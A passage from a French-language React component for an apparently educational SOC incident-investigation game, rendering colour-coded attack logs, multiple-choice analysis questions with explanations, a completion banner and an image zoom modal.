                      log.includes('[CRITICAL') || log.includes('[ENCRYPT]') || log.includes('[ALERTE ROUGE]') || log.includes('[NOTE]')
                        ? 'text-rose-400 font-bold'
                        : log.includes('[SUCCESS]') || log.includes('[PERMIT]') || log.includes('[VICTOIRE]')
                        ? 'text-emerald-400 font-bold'
                        : log.includes('[WARN]') || log.includes('[ACTION]')
                        ? 'text-amber-300 font-bold'
                        : 'text-slate-300'
                    }
                  >
                    {log}
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* COLONNE DROITE (5 COLONNES) : MODULE D'INVESTIGATION SOC (QUESTIONS / PREUVES) */}
        <div className="lg:col-span-5 space-y-4">
          <div className="p-6 rounded-3xl bg-white border border-slate-200/90 shadow-soft">
            <div className="flex items-center justify-between pb-3 mb-4 border-b border-slate-200">
              <span className="text-xs font-mono font-bold text-amber-700 flex items-center gap-1.5">
                <HelpCircle size={16} />
                <span>Question d'Analyse d'Incident</span>
              </span>
              <span className="text-xs font-mono font-bold text-sky-700 bg-sky-50 px-2.5 py-0.5 rounded-full border border-sky-200">
                +125 Points
              </span>
            </div>

            <p className="text-sm sm:text-base font-extrabold text-slate-900 mb-5 leading-snug">
              {currentStep.question}
            </p>

            {/* Options de réponse interactives */}
            <div className="space-y-2.5 mb-5">
              {currentStep.options.map((opt, optIdx) => {
                const isSelected = selectedOption === optIdx
                const isCorrect = optIdx === currentStep.correctOptionIndex
                const hasAnswered = answeredSteps[currentStep.id] !== undefined

                let btnStyle = 'bg-slate-50 border-slate-200 hover:border-sky-300 hover:bg-sky-50/50 text-slate-800'
                if (showExplanation || hasAnswered) {
                  if (isCorrect) {
                    btnStyle = 'bg-emerald-50 border-emerald-400 text-emerald-950 font-bold shadow-sm'
                  } else if (isSelected) {
                    btnStyle = 'bg-rose-50 border-rose-400 text-rose-950'
                  } else {
                    btnStyle = 'bg-slate-50 border-slate-200 text-slate-400 opacity-40'
                  }
                } else if (isSelected) {
                  btnStyle = 'bg-sky-500 text-white font-bold border-sky-500 shadow-sm'
                }

                return (
                  <button
                    key={optIdx}
                    onClick={() => handleAnswerSubmit(optIdx)}
                    disabled={showExplanation || hasAnswered}
                    className={`w-full p-3.5 rounded-xl border-2 text-left text-sm font-medium transition flex items-start gap-3 ${btnStyle}`}
                  >
                    <span className="w-6 h-6 rounded-lg bg-white border border-slate-300 flex items-center justify-center text-xs font-mono shrink-0 mt-0.5 text-slate-700 font-bold">
                      {String.fromCharCode(65 + optIdx)}
                    </span>
                    <span className="leading-snug">{opt}</span>
                  </button>
                )
              })}
            </div>

            {/* Explication pédagogique */}
            {showExplanation && (
              <motion.div
                initial={{ opacity: 0, y: 5 }}
                animate={{ opacity: 1, y: 0 }}
                className="p-4 rounded-xl bg-sky-50 border border-sky-200 text-sm space-y-2"
              >
                <div className="flex items-center gap-1.5 text-sky-800 font-bold font-mono">
                  <Info size={16} />
                  <span>Analyse & Rétro-ingénierie</span>
                </div>
                <p className="text-slate-800 leading-relaxed font-medium">{currentStep.explanation}</p>
                <div className="pt-2 border-t border-sky-200 text-xs text-amber-800 font-mono font-bold">
                  🔎 {currentStep.evidenceDetail}
                </div>
              </motion.div>
            )}

            {/* Navigation étape précédente / suivante */}
            <div className="pt-5 border-t border-slate-200 flex items-center justify-between gap-3 mt-4">
              <button
                onClick={handlePrevStep}
                disabled={currentStepIdx === 0}
                className="px-4 py-2.5 rounded-xl bg-white hover:bg-slate-50 disabled:opacity-30 border border-slate-300 text-slate-700 text-xs font-bold flex items-center gap-2 transition shadow-sm"
              >
                <ArrowLeft size={15} />
                <span>Précédent</span>
              </button>

              <button
                onClick={handleNextStep}
                disabled={currentStepIdx === steps.length - 1}
                className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-600 hover:to-blue-700 disabled:opacity-30 text-white text-xs font-bold flex items-center gap-2 shadow-md transition"
              >
                <span>Étape Suivante</span>
                <ArrowRight size={15} />
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* 5. CÉLÉBRATION SI TOUTES LES 8 ÉTAPES SONT ANALYSÉES */}
      {totalAnswered === steps.length && (
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="mt-8 p-8 rounded-3xl bg-sky-50 border-2 border-sky-300 shadow-soft flex flex-col md:flex-row items-center justify-between gap-6"
        >
          <div className="flex items-center gap-5">
            <div className="w-18 h-18 rounded-2xl bg-sky-100 text-sky-700 border border-sky-300 flex items-center justify-center text-4xl font-black shrink-0">
              🛡️
            </div>
            <div>
              <span className="px-3 py-1 rounded-full bg-sky-200/70 text-sky-800 text-xs font-mono font-bold uppercase">
                Investigation Complétée à 100%
              </span>
              <h3 className="text-2xl font-extrabold text-slate-900 mt-1">
                Félicitations ! Vous avez maîtrisé l'Anatomie Complète de l'Attaque & la Riposte !
              </h3>
              <p className="text-sm text-slate-600 mt-1">
                De l'hameçonnage initial de Sophie jusqu'à l'intervention de Marc au SOC et la restauration Air-Gap étanche.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <Link
              to="/quiz"
              onClick={() => sound.playSuccess()}
              className="px-7 py-3.5 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-sm shadow-md flex items-center gap-2 transition"
            >
              <span>Valider le Quiz Salle</span>
              <ArrowRight size={17} />
            </Link>
          </div>
        </motion.div>
      )}

      {/* 6. MODAL PLEIN ÉCRAN POUR VISIONNER UNE IMAGE EN GRAND */}
      {zoomedImage && (
        <div
          onClick={() => setZoomedImage(null)}
          className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4 cursor-pointer"
        >
          <div className="max-w-2xl w-full bg-white rounded-3xl overflow-hidden border border-slate-200 shadow-2xl relative p-2">
            <img src={zoomedImage} alt="Illustration plein écran" className="w-full h-auto object-cover rounded-2xl" />
            <button
              onClick={() => setZoomedImage(null)}
              className="absolute top-5 right-5 px-3 py-1.5 rounded-xl bg-slate-900/80 hover:bg-slate-900 text-white text-xs font-mono font-bold"
            >
              ✕ Fermer
            </button>
          </div>
        </div>
      )}
    </div>
  )
}

